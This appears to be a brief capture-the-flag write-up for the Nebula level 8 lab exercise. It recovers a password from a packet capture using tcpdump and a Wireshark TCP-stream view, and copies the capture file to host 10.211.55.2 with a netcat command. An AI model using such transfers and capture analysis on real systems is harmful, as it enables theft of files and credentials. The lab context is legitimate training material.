.. _nebula08:

.. role:: bash(code)
	  :language: bash

Nebula 8
========

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level07/

**No Source Code Given**

Solution
--------

.. code-block:: bash

$ tcpdump -qns 0 -X -r capture.pcap
$ nc -l 2001 > capture.pcap
$ nc 10.211.55.2 2001 < capture.pcap

Open wireshark and look Wireshark and go to Analize -> Follow TCP stream, this will give you the password.
      
